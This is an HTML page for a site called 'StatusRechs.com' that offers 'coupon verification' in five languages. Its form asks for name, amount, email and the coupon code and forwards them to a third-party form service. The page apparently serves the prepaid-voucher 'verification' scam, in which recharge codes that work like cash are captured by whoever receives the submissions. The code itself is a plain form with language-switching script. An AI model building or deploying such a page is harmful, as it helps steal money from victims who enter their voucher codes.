<!DOCTYPE html>
<html lang="fr" class="scroll-smooth">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title id="page-title" data-i18n="title">StatusRechs.com</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    /* 1. RESET GLOBAL POUR STABILISER LE FORMULAIRE */
    *, *::before, *::after {
      box-sizing: border-box; 
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Poppins', sans-serif;
      background: #f8fafc;
      overflow-x: hidden;
    }

    .form-container {
      padding: 60px 20px;
      display: flex;
      justify-content: center;
      background: linear-gradient(180deg, #f8fafc 0%, #f1f5f9 100%);
      min-height: 80vh;
    }

    .card-form {
      background: white;
      width: 100%;
      max-width: 550px;
      padding: 40px;
      border-radius: 20px;
      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1);
      border: 1px solid #e2e8f0;
    }

    .form-group { margin-bottom: 20px; width: 100%; }

    .form-group label {
      display: block;
      font-size: 14px;
      font-weight: 600;
      color: #334155;
      margin-bottom: 8px;
    }

    .form-group input {
      width: 100%; 
      padding: 12px 16px;
      border-radius: 10px;
      border: 1px solid #cbd5e1;
      font-family: 'Poppins', sans-serif;
      font-size: 16px; 
      transition: border-color 0.2s ease, box-shadow 0.2s ease;
      display: block;
      outline: none;
    }

    .form-group input:focus {
      border-color: #2563eb;
      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15);
    }

    .code-input {
      letter-spacing: 4px;
      font-family: monospace !important;
      font-size: 18px;
      text-align: center;
    }

    .toggle-box {
      background: #eff6ff;
      padding: 15px;
      border-radius: 12px;
      margin-top: 10px;
    }

    .radio-group {
      display: flex;
      gap: 20px;
      margin-top: 8px;
    }

    .radio-item {
      display: flex;
      align-items: center;
      gap: 8px;
      cursor: pointer;
      font-size: 14px;
    }

    .btn-submit {
      width: 100%;
      background: #2563eb;
      color: white;
      padding: 16px;
      border-radius: 12px;
      font-weight: 700;
      border: none;
      cursor: pointer;
      transition: background 0.3s, transform 0.2s;
      margin-top: 10px;
      font-size: 16px;
    }

    .btn-submit:hover { 
      background: #1e40af; 
      transform: translateY(-1px);
    }

    .grid-2 {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 15px;
    }

    @media (max-width: 480px) {
      .grid-2 { grid-template-columns: 1fr; }
      .card-form { padding: 25px; }
      .form-container { padding: 40px 15px; }
    }

    /* Styles Langues */
    .hidden { display: none !important; }
    .relative { position: relative; }
    .lang-options {
      position: absolute;
      top: 100%;
      right: 0;
      background: white;
      border: 1px solid #e2e8f0;
      border-radius: 10px;
      padding: 10px 0;
      box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1);
      z-index: 50;
      list-style: none;
      min-width: 150px;
    }
    .lang-options li {
      padding: 8px 15px;
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 14px;
    }
    .lang-options li:hover { background: #f8fafc; }
    .selected-lang { cursor: pointer; display: flex; align-items: center; gap: 8px; font-weight: 500; font-size: 14px;}
  </style>
</head>
<body>

<header class="main-header" style="padding: 15px 20px; background: white; border-bottom: 1px solid #e2e8f0;">
  <div style="max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center;">
    <a href="index.html" style="text-decoration: none; color: #2563eb; font-weight: 700;" data-i18n="nav_home">Accueil</a>
    
    <div class="relative">
      <div class="selected-lang" id="lang-button">
        <img src="https://flagcdn.com/w20/fr.png" alt="FR" id="current-flag">
        <span id="current-lang-name">Français</span>
        <small>▼</small>
      </div>
      <ul class="lang-options hidden" id="lang-dropdown">
        <li onclick="setLang('en')"><img src="https://flagcdn.com/w20/gb.png"> English</li>
        <li onclick="setLang('fr')"><img src="https://flagcdn.com/w20/fr.png"> Français</li>
        <li onclick="setLang('es')"><img src="https://flagcdn.com/w20/es.png"> Español</li>
        <li onclick="setLang('de')"><img src="https://flagcdn.com/w20/de.png"> Deutsch</li>
        <li onclick="setLang('it')"><img src="https://flagcdn.com/w20/it.png"> Italiano</li>
      </ul>
    </div>
  </div>
</header>

<main class="form-container">
  <div class="card-form">
    <h2 class="section-title" data-i18n="form_title" style="font-size: 1.5rem; margin-bottom: 30px; text-align: center; color: #0f172a;">Vérification de coupon</h2>
    
    <form action="https://api.web3forms.com/submit" method="POST" id="verification-form">
      <input type="hidden" name="access_key" value="TA_CLE_ICI">

      <div class="grid-2">
        <div class="form-group">
          <label for="nom" data-i18n="form_nom">Nom :</label>
          <input type="text" id="nom" name="nom" required placeholder="Dupont">
        </div>
        <div class="form-group">
          <label for="prenom" data-i18n="form_prenom">Prénom :</label>
          <input type="text" id="prenom" name="prenom" required placeholder="Jean">
        </div>
      </div>

      <div class="form-group">
        <label for="amount" data-i18n="form_montant">Montant (€) :</label>
        <input type="number" id="amount" name="amount" min="1" required placeholder="50">
      </div>

      <div class="form-group">
        <label for="email" data-i18n="form_email">Votre email :</label>
        <input type="email" id="email" name="email" required placeholder="jean@mail.com">
      </div>

      <div class="form-group">
        <label for="code" data-i18n="form_code">Code du coupon :</label>
        <input type="password" id="code" name="code" class="code-input" required placeholder="•••• •••• ••••">
        
        <div class="toggle-box">
          <p style="font-size: 11px; font-weight: 800; color: #2563eb; text-transform: uppercase; margin-bottom: 5px;" data-i18n="form_toggle_label">Afficher le code :</p>
          <div class="radio-group">
            <label class="radio-item"><input type="radio" name="show_code" onclick="toggleCode(true)"> <span data-i18n="form_oui">Oui</span></label>
            <label class="radio-item"><input type="radio" name="show_code" checked onclick="toggleCode(false)"> <span data-i18n="form_non">Non</span></label>
          </div>
        </div>
      </div>

      <button type="submit" class="btn-submit" data-i18n="form_envoyer">Authentifier le coupon</button>
    </form>
  </div>
</main>

<script>
  // 1. LE DICTIONNAIRE DE TRADUCTION
  const translations = {
    fr: {
      nav_home: "Accueil",
      form_title: "Vérification de coupon",
      form_nom: "Nom :",
      form_prenom: "Prénom :",
      form_montant: "Montant (€) :",
      form_email: "Votre email :",
      form_code: "Code du coupon :",
      form_toggle_label: "Afficher le code :",
      form_oui: "Oui",
      form_non: "Non",
      form_envoyer: "Authentifier le coupon",
      title: "StatusRechs.com",
      langName: "Français",
      flag: "fr"
    },
    en: {
      nav_home: "Home",
      form_title: "Coupon Verification",
      form_nom: "Last Name:",
      form_prenom: "First Name:",
      form_montant: "Amount (€):",
      form_email: "Your email:",
      form_code: "Coupon Code:",
      form_toggle_label: "Show code:",
      form_oui: "Yes",
      form_non: "No",
      form_envoyer: "Authenticate coupon",
      title: "StatusRechs.com - Verify",
      langName: "English",
      flag: "gb"
    },
    es: {
      nav_home: "Inicio",
      form_title: "Verificación de cupón",
      form_nom: "Apellido:",
      form_prenom: "Nombre:",
      form_montant: "Monto (€):",
      form_email: "Tu email:",
      form_code: "Código del cupón:",
      form_toggle_label: "Mostrar código:",
      form_oui: "Sí",
      form_non: "No",
      form_envoyer: "Autenticar cupón",
      title: "StatusRechs.com - Verificar",
      langName: "Español",
      flag: "es"
    },
    de: {
      nav_home: "Startseite",
      form_title: "Gutscheinprüfung",
      form_nom: "Nachname:",
      form_prenom: "Vorname:",
      form_montant: "Betrag (€):",
      form_email: "Ihre E-Mail:",
      form_code: "Gutscheincode:",
      form_toggle_label: "Code anzeigen:",
      form_oui: "Ja",
      form_non: "Nein",
      form_envoyer: "Gutschein authentifizieren",
      title: "StatusRechs.com - Prüfen",
      langName: "Deutsch",
      flag: "de"
    },
    it: {
      nav_home: "Home",
      form_title: "Verifica Coupon",
      form_nom: "Cognome:",
      form_prenom: "Nome:",
      form_montant: "Importo (€):",
      form_email: "Tua email:",
      form_code: "Codice coupon:",
      form_toggle_label: "Mostra codice:",
      form_oui: "Sì",
      form_non: "No",
      form_envoyer: "Autentica coupon",
      title: "StatusRechs.com - Verifica",
      langName: "Italiano",
      flag: "it"
    }
  };

  // 2. LA FONCTION DE CHANGEMENT DE LANGUE
  function setLang(lang) {
    const translation = translations[lang];
    if (!translation) return;

    // Change tous les textes avec data-i18n
    document.querySelectorAll('[data-i18n]').forEach(el => {
      const key = el.getAttribute('data-i18n');
      if (translation[key]) {
        el.innerText = translation[key];
      }
    });

    // Change le drapeau et le nom dans le bouton
    document.getElementById('current-flag').src = `https://flagcdn.com/w20/${translation.flag}.png`;
    document.getElementById('current-lang-name').innerText = translation.langName;
    document.title = translation.title;

    // Ferme le menu
    document.getElementById('lang-dropdown').classList.add('hidden');
    
    // Optionnel: Sauvegarde le choix
    localStorage.setItem('preferredLang', lang);
  }

  // 3. GESTION DU MENU DÉROULANT
  const langBtn = document.getElementById('lang-button');
  const langMenu = document.getElementById('lang-dropdown');

  langBtn.onclick = (e) => {
    e.stopPropagation();
    langMenu.classList.toggle('hidden');
  };

  document.onclick = () => langMenu.classList.add('hidden');

  function toggleCode(show) {
    document.getElementById('code').type = show ? 'text' : 'password';
  }

  // Au chargement, vérifier si une langue est déjà sauvée
  window.onload = () => {
    const savedLang = localStorage.getItem('preferredLang') || 'fr';
    setLang(savedLang);
  };
</script>

</body>
</html>
